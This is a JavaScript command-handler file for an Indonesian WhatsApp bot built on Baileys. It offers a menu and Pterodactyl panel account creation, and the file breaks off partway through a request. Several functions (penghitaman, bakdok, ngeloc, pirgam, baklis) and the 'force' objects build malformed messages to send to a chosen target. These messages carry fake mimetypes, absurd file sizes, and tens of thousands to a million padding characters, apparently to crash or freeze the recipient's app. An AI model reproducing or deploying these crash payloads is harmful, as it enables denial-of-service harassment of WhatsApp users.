module.exports = async (tamzz, m, store) => {
try {
const from = m.key.remoteJid
const fs = require('fs')
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©.®Δ^βα¦|/\\©^]/gi) : ''
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const qmsg = (quoted.msg || quoted)
const mime = (quoted.msg || quoted).mimetype || ''
const db_user = JSON.parse(fs.readFileSync('./all/database/pengguna.json'));
const murbug = JSON.parse(fs.readFileSync("./all/database/murbug.json"))
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const chalk = require('chalk')
const isGroup = from.endsWith('@g.us')
const botNumber = await tamzz.decodeJid(tamzz.user.id)
const sender = m.key.fromMe ? (tamzz.user.id.split(':')[0]+'@s.whatsapp.net' || tamzz.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const cmd = prefix + command;
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await tamzz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const { remini } = require('./all/remini')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./all/uploader')
const { version } = require("./package.json")
const { serverCreate } = require("./all/settings");
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { cekUser } = require("./all/database/pengguna")
const { Client } = require('ssh2');

    const kalgans = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363301428946392@newsletter',
    newsletterName: 'tamz‎',
    caption: body
}}
}
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return tamzz.updateBlockStatus(m.sender, 'block')

// color
const listcolor = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white'];
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)];
// tampilan console
try {
    if (isCmd) {
        const now = new Date();
        const dateString = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        console.log(color(`Waktu :`, `${randomcolor}`), color(dateString, `white`));
    }
} catch (error) {
    console.error("Terjadi kesalahan saat menampilkan waktu:", error);
}

// shift

let isMurbug = murbug.includes(m.sender)

tamzz.sendTextMentions = async (jid, teks, mention, quoted = '') => {
        	return tamzz.sendMessage(jid, { text: teks, mentions: mention }, { quoted })
        }

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const prem2 = JSON.parse(fs.readFileSync("./all/database/premium2.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const ownerNumber2 = JSON.parse(fs.readFileSync("./all/database/owner2.json"))

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./thumb.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await tamzz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await tamzz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await tamzz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: tamzz.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #henzbugz ☠️"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await tamzz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await tamzz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./thumb.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isPremium2 = prem2.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await tamzz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await tamzz.getName(i + '@s.whatsapp.net')}\n
FN:${await tamzz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:MikkuBot@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://chat.whatsapp.com/IAvxLU8KWknAYJngDXOctu
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - zxv`
}
}
}

function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await tamzz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

//Function Channel Reply
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363301428946392@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg",
caption: `Powered By MikkuBot`,
}
}}

tamzz.sendList = async (jid, title, footer, btn, options = {}) => {
                let msg = generateWAMessageFromContent(jid, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                ...options,
                                body: proto.Message.InteractiveMessage.Body.create({ text: title }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: footer || "Powered By MikkuBot" }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [
                                        {
                                            "name": "single_select",
                                            "buttonParamsJson": JSON.stringify(btn)
                                        },
                                    ]
                                })
                            })
                        }
                    }
                }, {})
                return await tamzz.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                })
            }

//array
function removeItem(array, item) {
  return array.filter(elem => !(elem.jid === item.jid && elem.state === item.state));
}
//==================\\
function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }
  
// Function Pay
const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `120363301428946392@newsletter`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `YT: fadzvpn`
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

//database panel #2
const seller = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const seller2 = JSON.parse(fs.readFileSync("./all/database/premium2.json"))

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: qpayment })
tamzz.relayMessage(jid, order.message, { messageId: order.key.id})
}
//=============\\
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

// Function Reply
const reply = (teks) => { 
tamzz.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "ϝαԃȥʋρɳ", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg", 
"sourceUrl": "" }}}, { quoted: qpayment }) }

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `BOT BY ϝαԃȥʋρɳ`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
tamzz.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:kalgans})
tamzz.groupParticipantsUpdate(m.chat, [sender], 'remove')
tamzz.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {
case 'menu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋*
𝘏𝘈𝘓𝘓𝘖 𝘖𝘕𝘐𝘐-𝘊𝘏𝘈𝘕 , 𝘗𝘌𝘙𝘒𝘌𝘕𝘈𝘓𝘒𝘈𝘕 𝘚𝘈𝘠𝘈 𝘔𝘐𝘒𝘒𝘜𝘉𝘖𝘛,
𝘉𝘖𝘛 𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗 𝘠𝘎 𝘋𝘐𝘒𝘌𝘔𝘉𝘈𝘕𝘎𝘒𝘈𝘕 𝘖𝘓𝘌𝘏 𝘍𝘈𝘋𝘡𝘝𝘗𝘕.
𝘉𝘌𝘙𝘐𝘒𝘜𝘛 𝘈𝘋𝘈𝘓𝘈𝘏 𝘋𝘈𝘍𝘛𝘈𝘙 𝘔𝘌𝘕𝘜 𝘋𝘐 𝘔𝘐𝘒𝘒𝘜𝘉𝘖𝘛.

┏╍╍╍┉╍☉ \`INFO USER\`
┋░▹ *Name* : ${pushname}
┋░▹ *Number* : ${m.sender.split('@')[0]}
┋░▹ *Status* : ${isPremium ? "Premium" : "Free"}
┗━━━━━━━━━━━━━━━━━━
┏╍╍╍┉╍☉ \`INFO BOT\`
┋░▹ *Bot Name* : MikkuBot
┋░▹ *Nomor Creator* : @${owner.split("@")[0]}
┋░▹ *Versi Bailyes* : ${version}
┋░▹ *Runtime* : ${runtime(process.uptime())}
┋░▹ *Jam* : ${wib}
┋░▹ *Today* : ${hariini}
┗━━━━━━━━━━━━━━━━━━
 
┏╍╍╍┉╍☉ \`LIST MENU\`
┋░▹ ${prefix}ᴀʟʟᴍᴇɴᴜ
┋░▹ ${prefix}ᴍᴇɴᴜᴄᴏɴғɪɢ
┋░▹ ${prefix}ɢʀᴏᴜᴘᴍᴇɴᴜ
┋░▹ ${prefix}ᴘᴀɴᴇʟᴍᴇɴᴜ
┋░▹ ${prefix}ᴏᴡɴᴇʀᴍᴇɴᴜ
┋░▹ ${prefix}ᴅᴏᴍᴀɪɴᴍᴇɴᴜ
┋░▹ ${prefix}ᴍᴇɴᴜᴛᴏᴏʟs
┋░▹ ${prefix}ᴘᴜsʜᴍᴇɴᴜ
┋░▹ ${prefix}ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴍᴇɴᴜ
┋░▹ ${prefix}ᴠᴘsᴍᴇɴᴜ
┋░▹ ${prefix}ʙᴜɢᴍᴇɴᴜ
┋░▹ ${prefix}ᴏᴛᴏᴍᴀᴛɪsᴍᴇɴᴜ
┋░▹ ${prefix}ᴊᴘᴍᴍᴇɴᴜ
┗━━━━━━━━━━━━━━━━━━
ɴᴏᴛᴇ: ᴋᴇᴛɪᴋ .ᴍᴇɴᴜ2 ᴜɴᴛᴜᴋ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ`

           tamzz.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await tamzz.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break
             
             
case "1gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "xibj2dgv8"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
